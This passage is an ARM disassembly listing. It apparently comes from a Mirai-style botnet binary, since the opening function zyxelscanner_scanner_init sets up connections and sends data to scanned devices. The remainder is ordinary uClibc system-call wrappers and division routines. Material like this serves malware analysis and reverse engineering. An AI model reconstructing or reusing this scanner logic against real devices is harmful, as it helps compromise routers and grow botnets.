   15b94:	e5963014 	ldr	r3, [r6, #20]
   15b98:	e5912000 	ldr	r2, [r1]
   15b9c:	e0833000 	add	r3, r3, r0
   15ba0:	e5863014 	str	r3, [r6, #20]
   15ba4:	e5862004 	str	r2, [r6, #4]
   15ba8:	e1a00005 	mov	r0, r5
   15bac:	ebfffbdd 	bl	14b28 <util_strlen>
   15bb0:	e3a03000 	mov	r3, #0
   15bb4:	e0860000 	add	r0, r6, r0
   15bb8:	e5c03018 	strb	r3, [r0, #24]
   15bbc:	eaffffd9 	b	15b28 <zyxelscanner_scanner_init+0x918>
   15bc0:	e2865018 	add	r5, r6, #24
   15bc4:	e1a00005 	mov	r0, r5
   15bc8:	e2861058 	add	r1, r6, #88	; 0x58
   15bcc:	e3a02d0f 	mov	r2, #960	; 0x3c0
   15bd0:	eb00033a 	bl	168c0 <__GI_memmove>
   15bd4:	e5963014 	ldr	r3, [r6, #20]
   15bd8:	e2433040 	sub	r3, r3, #64	; 0x40
   15bdc:	e5863014 	str	r3, [r6, #20]
   15be0:	eaffffd7 	b	15b44 <zyxelscanner_scanner_init+0x934>
   15be4:	e5960000 	ldr	r0, [r6]
   15be8:	eb001094 	bl	19e40 <__GI___libc_close>
   15bec:	e3a03000 	mov	r3, #0
   15bf0:	e3e02000 	mvn	r2, #0
   15bf4:	e5863008 	str	r3, [r6, #8]
   15bf8:	e5862000 	str	r2, [r6]
   15bfc:	e1a00005 	mov	r0, r5
   15c00:	e3a01b01 	mov	r1, #1024	; 0x400
   15c04:	ebfffbec 	bl	14bbc <util_zero>
   15c08:	eaffff86 	b	15a28 <zyxelscanner_scanner_init+0x818>
   15c0c:	e2864e41 	add	r4, r6, #1040	; 0x410
   15c10:	e2844008 	add	r4, r4, #8
   15c14:	e59f1090 	ldr	r1, [pc, #144]	; 15cac <zyxelscanner_scanner_init+0xa9c>
   15c18:	e1a00004 	mov	r0, r4
   15c1c:	ebfffbcb 	bl	14b50 <util_strcpy>
   15c20:	e1a00004 	mov	r0, r4
   15c24:	e7975008 	ldr	r5, [r7, r8]
   15c28:	ebfffbbe 	bl	14b28 <util_strlen>
   15c2c:	e3a03901 	mov	r3, #16384	; 0x4000
   15c30:	e1a02000 	mov	r2, r0
   15c34:	e1a01004 	mov	r1, r4
   15c38:	e1a00005 	mov	r0, r5
   15c3c:	eb0004a1 	bl	16ec8 <__libc_send>
   15c40:	e3a01e7e 	mov	r1, #2016	; 0x7e0
   15c44:	e1a00004 	mov	r0, r4
   15c48:	e2811008 	add	r1, r1, #8
   15c4c:	ebfffbda 	bl	14bbc <util_zero>
   15c50:	e3a01b01 	mov	r1, #1024	; 0x400
   15c54:	e2860018 	add	r0, r6, #24
   15c58:	ebfffbd7 	bl	14bbc <util_zero>
   15c5c:	e7970008 	ldr	r0, [r7, r8]
   15c60:	eb001076 	bl	19e40 <__GI___libc_close>
   15c64:	e1a00006 	mov	r0, r6
   15c68:	ebfffd33 	bl	1513c <zyxelscanner_setup_connection>
   15c6c:	e3a03003 	mov	r3, #3
   15c70:	e5863008 	str	r3, [r6, #8]
   15c74:	eaffff6b 	b	15a28 <zyxelscanner_scanner_init+0x818>
   15c78:	e7970008 	ldr	r0, [r7, r8]
   15c7c:	eb00106f 	bl	19e40 <__GI___libc_close>
   15c80:	e3e03000 	mvn	r3, #0
   15c84:	e7873008 	str	r3, [r7, r8]
   15c88:	e5864008 	str	r4, [r6, #8]
   15c8c:	eaffff65 	b	15a28 <zyxelscanner_scanner_init+0x818>
   15c90:	00028db0 	.word	0x00028db0
   15c94:	0002b8ac 	.word	0x0002b8ac
   15c98:	00028de0 	.word	0x00028de0
   15c9c:	0002b8b0 	.word	0x0002b8b0
   15ca0:	00028db4 	.word	0x00028db4
   15ca4:	00028db8 	.word	0x00028db8
   15ca8:	66666667 	.word	0x66666667
   15cac:	00020340 	.word	0x00020340

00015cb0 <__udivsi3>:
   15cb0:	e2512001 	subs	r2, r1, #1
   15cb4:	012fff1e 	bxeq	lr
   15cb8:	3a000036 	bcc	15d98 <__udivsi3+0xe8>
   15cbc:	e1500001 	cmp	r0, r1
   15cc0:	9a000022 	bls	15d50 <__udivsi3+0xa0>
   15cc4:	e1110002 	tst	r1, r2
   15cc8:	0a000023 	beq	15d5c <__udivsi3+0xac>
   15ccc:	e311020e 	tst	r1, #-536870912	; 0xe0000000
   15cd0:	01a01181 	lsleq	r1, r1, #3
   15cd4:	03a03008 	moveq	r3, #8
   15cd8:	13a03001 	movne	r3, #1
   15cdc:	e3510201 	cmp	r1, #268435456	; 0x10000000
   15ce0:	31510000 	cmpcc	r1, r0
   15ce4:	31a01201 	lslcc	r1, r1, #4
   15ce8:	31a03203 	lslcc	r3, r3, #4
   15cec:	3afffffa 	bcc	15cdc <__udivsi3+0x2c>
   15cf0:	e3510102 	cmp	r1, #-2147483648	; 0x80000000
   15cf4:	31510000 	cmpcc	r1, r0
   15cf8:	31a01081 	lslcc	r1, r1, #1
   15cfc:	31a03083 	lslcc	r3, r3, #1
   15d00:	3afffffa 	bcc	15cf0 <__udivsi3+0x40>
   15d04:	e3a02000 	mov	r2, #0
   15d08:	e1500001 	cmp	r0, r1
   15d0c:	20400001 	subcs	r0, r0, r1
   15d10:	21822003 	orrcs	r2, r2, r3
   15d14:	e15000a1 	cmp	r0, r1, lsr #1
   15d18:	204000a1 	subcs	r0, r0, r1, lsr #1
   15d1c:	218220a3 	orrcs	r2, r2, r3, lsr #1
   15d20:	e1500121 	cmp	r0, r1, lsr #2
   15d24:	20400121 	subcs	r0, r0, r1, lsr #2
   15d28:	21822123 	orrcs	r2, r2, r3, lsr #2
   15d2c:	e15001a1 	cmp	r0, r1, lsr #3
   15d30:	204001a1 	subcs	r0, r0, r1, lsr #3
   15d34:	218221a3 	orrcs	r2, r2, r3, lsr #3
   15d38:	e3500000 	cmp	r0, #0
   15d3c:	11b03223 	lsrsne	r3, r3, #4
   15d40:	11a01221 	lsrne	r1, r1, #4
   15d44:	1affffef 	bne	15d08 <__udivsi3+0x58>
   15d48:	e1a00002 	mov	r0, r2
   15d4c:	e12fff1e 	bx	lr
   15d50:	03a00001 	moveq	r0, #1
   15d54:	13a00000 	movne	r0, #0
   15d58:	e12fff1e 	bx	lr
   15d5c:	e3510801 	cmp	r1, #65536	; 0x10000
   15d60:	21a01821 	lsrcs	r1, r1, #16
   15d64:	23a02010 	movcs	r2, #16
   15d68:	33a02000 	movcc	r2, #0
   15d6c:	e3510c01 	cmp	r1, #256	; 0x100
   15d70:	21a01421 	lsrcs	r1, r1, #8
   15d74:	22822008 	addcs	r2, r2, #8
   15d78:	e3510010 	cmp	r1, #16
   15d7c:	21a01221 	lsrcs	r1, r1, #4
   15d80:	22822004 	addcs	r2, r2, #4
   15d84:	e3510004 	cmp	r1, #4
   15d88:	82822003 	addhi	r2, r2, #3
   15d8c:	908220a1 	addls	r2, r2, r1, lsr #1
   15d90:	e1a00230 	lsr	r0, r0, r2
   15d94:	e12fff1e 	bx	lr
   15d98:	e52de008 	str	lr, [sp, #-8]!
   15d9c:	eb000059 	bl	15f08 <__div0>
   15da0:	e3a00000 	mov	r0, #0
   15da4:	e49de008 	ldr	lr, [sp], #8
   15da8:	e12fff1e 	bx	lr

00015dac <__aeabi_uidivmod>:
   15dac:	e92d4003 	push	{r0, r1, lr}
   15db0:	ebffffbe 	bl	15cb0 <__udivsi3>
   15db4:	e8bd4006 	pop	{r1, r2, lr}
   15db8:	e0030092 	mul	r3, r2, r0
   15dbc:	e0411003 	sub	r1, r1, r3
   15dc0:	e12fff1e 	bx	lr

00015dc4 <__divsi3>:
   15dc4:	e3510000 	cmp	r1, #0
   15dc8:	e020c001 	eor	ip, r0, r1
   15dcc:	0a000042 	beq	15edc <__divsi3+0x118>
   15dd0:	42611000 	rsbmi	r1, r1, #0
   15dd4:	e2512001 	subs	r2, r1, #1
   15dd8:	0a000027 	beq	15e7c <__divsi3+0xb8>
   15ddc:	e1b03000 	movs	r3, r0
   15de0:	42603000 	rsbmi	r3, r0, #0
   15de4:	e1530001 	cmp	r3, r1
   15de8:	9a000026 	bls	15e88 <__divsi3+0xc4>
   15dec:	e1110002 	tst	r1, r2
   15df0:	0a000028 	beq	15e98 <__divsi3+0xd4>
   15df4:	e311020e 	tst	r1, #-536870912	; 0xe0000000
   15df8:	01a01181 	lsleq	r1, r1, #3
   15dfc:	03a02008 	moveq	r2, #8
   15e00:	13a02001 	movne	r2, #1
   15e04:	e3510201 	cmp	r1, #268435456	; 0x10000000
   15e08:	31510003 	cmpcc	r1, r3
   15e0c:	31a01201 	lslcc	r1, r1, #4
   15e10:	31a02202 	lslcc	r2, r2, #4
   15e14:	3afffffa 	bcc	15e04 <__divsi3+0x40>
   15e18:	e3510102 	cmp	r1, #-2147483648	; 0x80000000
   15e1c:	31510003 	cmpcc	r1, r3
   15e20:	31a01081 	lslcc	r1, r1, #1
   15e24:	31a02082 	lslcc	r2, r2, #1
   15e28:	3afffffa 	bcc	15e18 <__divsi3+0x54>
   15e2c:	e3a00000 	mov	r0, #0
   15e30:	e1530001 	cmp	r3, r1
   15e34:	20433001 	subcs	r3, r3, r1
   15e38:	21800002 	orrcs	r0, r0, r2
   15e3c:	e15300a1 	cmp	r3, r1, lsr #1
   15e40:	204330a1 	subcs	r3, r3, r1, lsr #1
   15e44:	218000a2 	orrcs	r0, r0, r2, lsr #1
   15e48:	e1530121 	cmp	r3, r1, lsr #2
   15e4c:	20433121 	subcs	r3, r3, r1, lsr #2
   15e50:	21800122 	orrcs	r0, r0, r2, lsr #2
   15e54:	e15301a1 	cmp	r3, r1, lsr #3
   15e58:	204331a1 	subcs	r3, r3, r1, lsr #3
   15e5c:	218001a2 	orrcs	r0, r0, r2, lsr #3
   15e60:	e3530000 	cmp	r3, #0
   15e64:	11b02222 	lsrsne	r2, r2, #4
   15e68:	11a01221 	lsrne	r1, r1, #4
   15e6c:	1affffef 	bne	15e30 <__divsi3+0x6c>
   15e70:	e35c0000 	cmp	ip, #0
   15e74:	42600000 	rsbmi	r0, r0, #0
   15e78:	e12fff1e 	bx	lr
   15e7c:	e13c0000 	teq	ip, r0
   15e80:	42600000 	rsbmi	r0, r0, #0
   15e84:	e12fff1e 	bx	lr
   15e88:	33a00000 	movcc	r0, #0
   15e8c:	01a00fcc 	asreq	r0, ip, #31
   15e90:	03800001 	orreq	r0, r0, #1
   15e94:	e12fff1e 	bx	lr
   15e98:	e3510801 	cmp	r1, #65536	; 0x10000
   15e9c:	21a01821 	lsrcs	r1, r1, #16
   15ea0:	23a02010 	movcs	r2, #16
   15ea4:	33a02000 	movcc	r2, #0
   15ea8:	e3510c01 	cmp	r1, #256	; 0x100
   15eac:	21a01421 	lsrcs	r1, r1, #8
   15eb0:	22822008 	addcs	r2, r2, #8
   15eb4:	e3510010 	cmp	r1, #16
   15eb8:	21a01221 	lsrcs	r1, r1, #4
   15ebc:	22822004 	addcs	r2, r2, #4
   15ec0:	e3510004 	cmp	r1, #4
   15ec4:	82822003 	addhi	r2, r2, #3
   15ec8:	908220a1 	addls	r2, r2, r1, lsr #1
   15ecc:	e35c0000 	cmp	ip, #0
   15ed0:	e1a00233 	lsr	r0, r3, r2
   15ed4:	42600000 	rsbmi	r0, r0, #0
   15ed8:	e12fff1e 	bx	lr
   15edc:	e52de008 	str	lr, [sp, #-8]!
   15ee0:	eb000008 	bl	15f08 <__div0>
   15ee4:	e3a00000 	mov	r0, #0
   15ee8:	e49de008 	ldr	lr, [sp], #8
   15eec:	e12fff1e 	bx	lr

00015ef0 <__aeabi_idivmod>:
   15ef0:	e92d4003 	push	{r0, r1, lr}
   15ef4:	ebffffb2 	bl	15dc4 <__divsi3>
   15ef8:	e8bd4006 	pop	{r1, r2, lr}
   15efc:	e0030092 	mul	r3, r2, r0
   15f00:	e0411003 	sub	r1, r1, r3
   15f04:	e12fff1e 	bx	lr

00015f08 <__div0>:
   15f08:	e92d4002 	push	{r1, lr}
   15f0c:	e3a00008 	mov	r0, #8
   15f10:	eb000f39 	bl	19bfc <__GI_raise>
   15f14:	e8bd4002 	pop	{r1, lr}
   15f18:	e12fff1e 	bx	lr

00015f1c <__GI___fcntl_nocancel>:
   15f1c:	e92d000e 	push	{r1, r2, r3}
   15f20:	e92d4080 	push	{r7, lr}
   15f24:	e24dd00c 	sub	sp, sp, #12
   15f28:	e59d1014 	ldr	r1, [sp, #20]
   15f2c:	e241300c 	sub	r3, r1, #12
   15f30:	e3530002 	cmp	r3, #2
   15f34:	e28d301c 	add	r3, sp, #28
   15f38:	e58d3004 	str	r3, [sp, #4]
   15f3c:	e59d2018 	ldr	r2, [sp, #24]
   15f40:	8a000008 	bhi	15f68 <__GI___fcntl_nocancel+0x4c>
   15f44:	e3a070dd 	mov	r7, #221	; 0xdd
   15f48:	ef000000 	svc	0x00000000
   15f4c:	e3700a01 	cmn	r0, #4096	; 0x1000
   15f50:	e1a02000 	mov	r2, r0
   15f54:	9a000008 	bls	15f7c <__GI___fcntl_nocancel+0x60>
   15f58:	e59f304c 	ldr	r3, [pc, #76]	; 15fac <__GI___fcntl_nocancel+0x90>
   15f5c:	eb001243 	bl	1a870 <__aeabi_read_tp>
   15f60:	e79f3003 	ldr	r3, [pc, r3]
   15f64:	ea000009 	b	15f90 <__GI___fcntl_nocancel+0x74>
   15f68:	e3a07037 	mov	r7, #55	; 0x37
   15f6c:	ef000000 	svc	0x00000000
   15f70:	e3700a01 	cmn	r0, #4096	; 0x1000
   15f74:	e1a02000 	mov	r2, r0
   15f78:	8a000001 	bhi	15f84 <__GI___fcntl_nocancel+0x68>
   15f7c:	e1a00002 	mov	r0, r2
   15f80:	ea000005 	b	15f9c <__GI___fcntl_nocancel+0x80>
   15f84:	e59f3024 	ldr	r3, [pc, #36]	; 15fb0 <__GI___fcntl_nocancel+0x94>
   15f88:	eb001238 	bl	1a870 <__aeabi_read_tp>
   15f8c:	e79f3003 	ldr	r3, [pc, r3]
   15f90:	e2622000 	rsb	r2, r2, #0
   15f94:	e7802003 	str	r2, [r0, r3]
   15f98:	e3e00000 	mvn	r0, #0
   15f9c:	e28dd00c 	add	sp, sp, #12
   15fa0:	e8bd4080 	pop	{r7, lr}
   15fa4:	e28dd00c 	add	sp, sp, #12
   15fa8:	e12fff1e 	bx	lr
   15fac:	00012a84 	.word	0x00012a84
   15fb0:	00012a58 	.word	0x00012a58

00015fb4 <__GI___libc_fcntl>:
   15fb4:	e92d000e 	push	{r1, r2, r3}
   15fb8:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   15fbc:	e59f30d4 	ldr	r3, [pc, #212]	; 16098 <__GI___libc_fcntl+0xe4>
   15fc0:	e59f20d4 	ldr	r2, [pc, #212]	; 1609c <__GI___libc_fcntl+0xe8>
   15fc4:	e08f3003 	add	r3, pc, r3
   15fc8:	e7932002 	ldr	r2, [r3, r2]
   15fcc:	e24dd008 	sub	sp, sp, #8
   15fd0:	e28d3024 	add	r3, sp, #36	; 0x24
   15fd4:	e3520000 	cmp	r2, #0
   15fd8:	e58d3004 	str	r3, [sp, #4]
   15fdc:	e1a05000 	mov	r5, r0
   15fe0:	e59d701c 	ldr	r7, [sp, #28]
   15fe4:	e59d4020 	ldr	r4, [sp, #32]
   15fe8:	0a000002 	beq	15ff8 <__GI___libc_fcntl+0x44>
   15fec:	e3570007 	cmp	r7, #7
   15ff0:	1357000e 	cmpne	r7, #14
   15ff4:	0a00000f 	beq	16038 <__GI___libc_fcntl+0x84>
   15ff8:	e1a01007 	mov	r1, r7
   15ffc:	e1a02004 	mov	r2, r4
   16000:	e3a070dd 	mov	r7, #221	; 0xdd
   16004:	ef000000 	svc	0x00000000
   16008:	e3700a01 	cmn	r0, #4096	; 0x1000
   1600c:	e1a02000 	mov	r2, r0
   16010:	91a00000 	movls	r0, r0
   16014:	9a000005 	bls	16030 <__GI___libc_fcntl+0x7c>
   16018:	e59f3080 	ldr	r3, [pc, #128]	; 160a0 <__GI___libc_fcntl+0xec>
   1601c:	eb001213 	bl	1a870 <__aeabi_read_tp>
   16020:	e79f3003 	ldr	r3, [pc, r3]
   16024:	e2622000 	rsb	r2, r2, #0
   16028:	e7802003 	str	r2, [r0, r3]
   1602c:	e3e00000 	mvn	r0, #0
   16030:	e1a07000 	mov	r7, r0
   16034:	ea000012 	b	16084 <__GI___libc_fcntl+0xd0>
   16038:	eb00102a 	bl	1a0e8 <__libc_enable_asynccancel>
   1603c:	e1a01007 	mov	r1, r7
   16040:	e1a06000 	mov	r6, r0
   16044:	e1a02004 	mov	r2, r4
   16048:	e1a00005 	mov	r0, r5
   1604c:	e3a070dd 	mov	r7, #221	; 0xdd
   16050:	ef000000 	svc	0x00000000
   16054:	e3700a01 	cmn	r0, #4096	; 0x1000
   16058:	e1a02000 	mov	r2, r0
   1605c:	9a000005 	bls	16078 <__GI___libc_fcntl+0xc4>
   16060:	e59f303c 	ldr	r3, [pc, #60]	; 160a4 <__GI___libc_fcntl+0xf0>
   16064:	e2622000 	rsb	r2, r2, #0
   16068:	eb001200 	bl	1a870 <__aeabi_read_tp>
   1606c:	e79f3003 	ldr	r3, [pc, r3]
   16070:	e7802003 	str	r2, [r0, r3]
   16074:	e3e02000 	mvn	r2, #0
   16078:	e1a00006 	mov	r0, r6
   1607c:	e1a07002 	mov	r7, r2
   16080:	eb000ff6 	bl	1a060 <__libc_disable_asynccancel>
   16084:	e1a00007 	mov	r0, r7
   16088:	e28dd008 	add	sp, sp, #8
   1608c:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   16090:	e28dd00c 	add	sp, sp, #12
   16094:	e12fff1e 	bx	lr
   16098:	000129c8 	.word	0x000129c8
   1609c:	0000356c 	.word	0x0000356c
   160a0:	000129c4 	.word	0x000129c4
   160a4:	00012978 	.word	0x00012978

000160a8 <getppid>:
   160a8:	e52d7004 	push	{r7}		; (str r7, [sp, #-4]!)
   160ac:	e3a07040 	mov	r7, #64	; 0x40
   160b0:	ef000000 	svc	0x00000000
   160b4:	e8bd0080 	ldmfd	sp!, {r7}
   160b8:	e12fff1e 	bx	lr

000160bc <__GI_ioctl>:
   160bc:	e92d000e 	push	{r1, r2, r3}
   160c0:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   160c4:	e59f30c0 	ldr	r3, [pc, #192]	; 1618c <__GI_ioctl+0xd0>
   160c8:	e59f20c0 	ldr	r2, [pc, #192]	; 16190 <__GI_ioctl+0xd4>
   160cc:	e08f3003 	add	r3, pc, r3
   160d0:	e7932002 	ldr	r2, [r3, r2]
   160d4:	e24dd008 	sub	sp, sp, #8
   160d8:	e28d3024 	add	r3, sp, #36	; 0x24
   160dc:	e3520000 	cmp	r2, #0
   160e0:	e58d3004 	str	r3, [sp, #4]
   160e4:	e1a04000 	mov	r4, r0
   160e8:	e28d501c 	add	r5, sp, #28
   160ec:	e89500a0 	ldm	r5, {r5, r7}
   160f0:	1a00000d 	bne	1612c <__GI_ioctl+0x70>
   160f4:	e1a02007 	mov	r2, r7
   160f8:	e1a01005 	mov	r1, r5
   160fc:	e3a07036 	mov	r7, #54	; 0x36
   16100:	ef000000 	svc	0x00000000
   16104:	e3700a01 	cmn	r0, #4096	; 0x1000
   16108:	9a000005 	bls	16124 <__GI_ioctl+0x68>
   1610c:	e59f3080 	ldr	r3, [pc, #128]	; 16194 <__GI_ioctl+0xd8>
   16110:	e2602000 	rsb	r2, r0, #0
   16114:	e79f3003 	ldr	r3, [pc, r3]
   16118:	eb0011d4 	bl	1a870 <__aeabi_read_tp>
   1611c:	e7802003 	str	r2, [r0, r3]
   16120:	e3e00000 	mvn	r0, #0
   16124:	e1a07000 	mov	r7, r0
   16128:	ea000012 	b	16178 <__GI_ioctl+0xbc>
   1612c:	eb000fed 	bl	1a0e8 <__libc_enable_asynccancel>
   16130:	e1a02007 	mov	r2, r7
   16134:	e1a06000 	mov	r6, r0
   16138:	e1a01005 	mov	r1, r5
   1613c:	e1a00004 	mov	r0, r4
   16140:	e3a07036 	mov	r7, #54	; 0x36
   16144:	ef000000 	svc	0x00000000
   16148:	e3700a01 	cmn	r0, #4096	; 0x1000
   1614c:	e1a02000 	mov	r2, r0
   16150:	9a000005 	bls	1616c <__GI_ioctl+0xb0>
   16154:	e59f303c 	ldr	r3, [pc, #60]	; 16198 <__GI_ioctl+0xdc>
   16158:	e2602000 	rsb	r2, r0, #0
   1615c:	e79f3003 	ldr	r3, [pc, r3]
   16160:	eb0011c2 	bl	1a870 <__aeabi_read_tp>
   16164:	e7802003 	str	r2, [r0, r3]
   16168:	e3e02000 	mvn	r2, #0
   1616c:	e1a00006 	mov	r0, r6
   16170:	e1a07002 	mov	r7, r2
   16174:	eb000fb9 	bl	1a060 <__libc_disable_asynccancel>
   16178:	e1a00007 	mov	r0, r7
   1617c:	e28dd008 	add	sp, sp, #8
   16180:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   16184:	e28dd00c 	add	sp, sp, #12
   16188:	e12fff1e 	bx	lr
   1618c:	000128c0 	.word	0x000128c0
   16190:	0000356c 	.word	0x0000356c
   16194:	000128d0 	.word	0x000128d0
   16198:	00012888 	.word	0x00012888

0001619c <__GI_kill>:
   1619c:	e92d4080 	push	{r7, lr}
   161a0:	e3a07025 	mov	r7, #37	; 0x25
   161a4:	ef000000 	svc	0x00000000
   161a8:	e3700a01 	cmn	r0, #4096	; 0x1000
   161ac:	9a000005 	bls	161c8 <__GI_kill+0x2c>
   161b0:	e59f3018 	ldr	r3, [pc, #24]	; 161d0 <__GI_kill+0x34>
   161b4:	e2602000 	rsb	r2, r0, #0
   161b8:	e79f3003 	ldr	r3, [pc, r3]
   161bc:	eb0011ab 	bl	1a870 <__aeabi_read_tp>
   161c0:	e7802003 	str	r2, [r0, r3]
   161c4:	e3e00000 	mvn	r0, #0
   161c8:	e8bd4080 	pop	{r7, lr}
   161cc:	e12fff1e 	bx	lr
   161d0:	0001282c 	.word	0x0001282c

000161d4 <prctl>:
   161d4:	e92d4090 	push	{r4, r7, lr}
   161d8:	e59d400c 	ldr	r4, [sp, #12]
   161dc:	e3a070ac 	mov	r7, #172	; 0xac
   161e0:	ef000000 	svc	0x00000000
   161e4:	e3700a01 	cmn	r0, #4096	; 0x1000
   161e8:	e1a02000 	mov	r2, r0
   161ec:	91a00000 	movls	r0, r0
   161f0:	9a000005 	bls	1620c <prctl+0x38>
   161f4:	e59f3018 	ldr	r3, [pc, #24]	; 16214 <prctl+0x40>
   161f8:	eb00119c 	bl	1a870 <__aeabi_read_tp>
   161fc:	e79f3003 	ldr	r3, [pc, r3]
   16200:	e2622000 	rsb	r2, r2, #0
   16204:	e7802003 	str	r2, [r0, r3]
   16208:	e3e00000 	mvn	r0, #0
   1620c:	e8bd4090 	pop	{r4, r7, lr}
   16210:	e12fff1e 	bx	lr
   16214:	000127e8 	.word	0x000127e8

00016218 <__GI_readlink>:
   16218:	e92d4080 	push	{r7, lr}
   1621c:	e3a07055 	mov	r7, #85	; 0x55
   16220:	ef000000 	svc	0x00000000
   16224:	e3700a01 	cmn	r0, #4096	; 0x1000
   16228:	e1a02000 	mov	r2, r0
   1622c:	91a00000 	movls	r0, r0
   16230:	9a000005 	bls	1624c <__GI_readlink+0x34>
   16234:	e59f3018 	ldr	r3, [pc, #24]	; 16254 <__GI_readlink+0x3c>
   16238:	eb00118c 	bl	1a870 <__aeabi_read_tp>
   1623c:	e79f3003 	ldr	r3, [pc, r3]
   16240:	e2622000 	rsb	r2, r2, #0
   16244:	e7802003 	str	r2, [r0, r3]
   16248:	e3e00000 	mvn	r0, #0
   1624c:	e8bd4080 	pop	{r7, lr}
   16250:	e12fff1e 	bx	lr
   16254:	000127a8 	.word	0x000127a8

00016258 <__syscall_select>:
   16258:	e92d4090 	push	{r4, r7, lr}
   1625c:	e59d400c 	ldr	r4, [sp, #12]
   16260:	e3a0708e 	mov	r7, #142	; 0x8e
   16264:	ef000000 	svc	0x00000000
   16268:	e3700a01 	cmn	r0, #4096	; 0x1000
   1626c:	e1a02000 	mov	r2, r0
   16270:	91a00000 	movls	r0, r0
   16274:	9a000005 	bls	16290 <__syscall_select+0x38>
   16278:	e59f3018 	ldr	r3, [pc, #24]	; 16298 <__syscall_select+0x40>
   1627c:	eb00117b 	bl	1a870 <__aeabi_read_tp>
   16280:	e79f3003 	ldr	r3, [pc, r3]
   16284:	e2622000 	rsb	r2, r2, #0
   16288:	e7802003 	str	r2, [r0, r3]
   1628c:	e3e00000 	mvn	r0, #0
   16290:	e8bd4090 	pop	{r4, r7, lr}
   16294:	e12fff1e 	bx	lr
   16298:	00012764 	.word	0x00012764

0001629c <__libc_select>:
   1629c:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   162a0:	e59fc070 	ldr	ip, [pc, #112]	; 16318 <__libc_select+0x7c>
   162a4:	e59fe070 	ldr	lr, [pc, #112]	; 1631c <__libc_select+0x80>
   162a8:	e08fc00c 	add	ip, pc, ip
   162ac:	e79ce00e 	ldr	lr, [ip, lr]
   162b0:	e24dd00c 	sub	sp, sp, #12
   162b4:	e35e0000 	cmp	lr, #0
   162b8:	e1a0a000 	mov	sl, r0
   162bc:	e1a06001 	mov	r6, r1
   162c0:	e1a07002 	mov	r7, r2
   162c4:	e1a08003 	mov	r8, r3
   162c8:	e59d4028 	ldr	r4, [sp, #40]	; 0x28
   162cc:	1a000002 	bne	162dc <__libc_select+0x40>
   162d0:	e28dd00c 	add	sp, sp, #12
   162d4:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   162d8:	eaffffde 	b	16258 <__syscall_select>
   162dc:	eb000f81 	bl	1a0e8 <__libc_enable_asynccancel>
   162e0:	e1a01006 	mov	r1, r6
   162e4:	e1a05000 	mov	r5, r0
   162e8:	e1a02007 	mov	r2, r7
   162ec:	e1a03008 	mov	r3, r8
   162f0:	e1a0000a 	mov	r0, sl
   162f4:	e58d4000 	str	r4, [sp]
   162f8:	ebffffd6 	bl	16258 <__syscall_select>
   162fc:	e1a04000 	mov	r4, r0
   16300:	e1a00005 	mov	r0, r5
   16304:	eb000f55 	bl	1a060 <__libc_disable_asynccancel>
   16308:	e1a00004 	mov	r0, r4
   1630c:	e28dd00c 	add	sp, sp, #12
   16310:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   16314:	e12fff1e 	bx	lr
   16318:	000126e4 	.word	0x000126e4
   1631c:	0000356c 	.word	0x0000356c

00016320 <__GI_setsid>:
   16320:	e92d4080 	push	{r7, lr}
   16324:	e3a07042 	mov	r7, #66	; 0x42
   16328:	ef000000 	svc	0x00000000
   1632c:	e3700a01 	cmn	r0, #4096	; 0x1000
   16330:	e1a02000 	mov	r2, r0
   16334:	91a00000 	movls	r0, r0
   16338:	9a000005 	bls	16354 <__GI_setsid+0x34>
   1633c:	e59f3018 	ldr	r3, [pc, #24]	; 1635c <__GI_setsid+0x3c>
   16340:	eb00114a 	bl	1a870 <__aeabi_read_tp>
   16344:	e79f3003 	ldr	r3, [pc, r3]
   16348:	e2622000 	rsb	r2, r2, #0
   1634c:	e7802003 	str	r2, [r0, r3]
   16350:	e3e00000 	mvn	r0, #0
   16354:	e8bd4080 	pop	{r7, lr}
   16358:	e12fff1e 	bx	lr
   1635c:	000126a0 	.word	0x000126a0

00016360 <__GI_sigprocmask>:
   16360:	e92d4080 	push	{r7, lr}
   16364:	e3510000 	cmp	r1, #0
   16368:	e24dd008 	sub	sp, sp, #8
   1636c:	e1a0e000 	mov	lr, r0
   16370:	e1a07002 	mov	r7, r2
   16374:	0a00000b 	beq	163a8 <__GI_sigprocmask+0x48>
   16378:	e5913000 	ldr	r3, [r1]
   1637c:	e3530000 	cmp	r3, #0
   16380:	ba000002 	blt	16390 <__GI_sigprocmask+0x30>
   16384:	e5913004 	ldr	r3, [r1, #4]
   16388:	e3130001 	tst	r3, #1
   1638c:	0a000005 	beq	163a8 <__GI_sigprocmask+0x48>
   16390:	e8910003 	ldm	r1, {r0, r1}
   16394:	e3c13001 	bic	r3, r1, #1
   16398:	e3c02102 	bic	r2, r0, #-2147483648	; 0x80000000
   1639c:	e88d0003 	stm	sp, {r0, r1}
   163a0:	e88d000c 	stm	sp, {r2, r3}
   163a4:	e1a0100d 	mov	r1, sp
   163a8:	e1a02007 	mov	r2, r7
   163ac:	e1a0000e 	mov	r0, lr
   163b0:	e3a03008 	mov	r3, #8
   163b4:	e3a070af 	mov	r7, #175	; 0xaf
   163b8:	ef000000 	svc	0x00000000
   163bc:	e3700a01 	cmn	r0, #4096	; 0x1000
   163c0:	9a000005 	bls	163dc <__GI_sigprocmask+0x7c>
   163c4:	e59f301c 	ldr	r3, [pc, #28]	; 163e8 <__GI_sigprocmask+0x88>
   163c8:	e2602000 	rsb	r2, r0, #0
   163cc:	e79f3003 	ldr	r3, [pc, r3]
   163d0:	eb001126 	bl	1a870 <__aeabi_read_tp>
   163d4:	e7802003 	str	r2, [r0, r3]
   163d8:	e3e00000 	mvn	r0, #0
   163dc:	e28dd008 	add	sp, sp, #8
   163e0:	e8bd4080 	pop	{r7, lr}
   163e4:	e12fff1e 	bx	lr
   163e8:	00012618 	.word	0x00012618

000163ec <__GI_time>:
   163ec:	e92d4010 	push	{r4, lr}
   163f0:	e24dd008 	sub	sp, sp, #8
   163f4:	e1a04000 	mov	r4, r0
   163f8:	e3a01000 	mov	r1, #0
   163fc:	e1a0000d 	mov	r0, sp
   16400:	eb0011bb 	bl	1aaf4 <__GI_gettimeofday>
   16404:	e59d0000 	ldr	r0, [sp]
   16408:	e3540000 	cmp	r4, #0
   1640c:	15840000 	strne	r0, [r4]
   16410:	e28dd008 	add	sp, sp, #8
   16414:	e8bd4010 	pop	{r4, lr}
   16418:	e12fff1e 	bx	lr

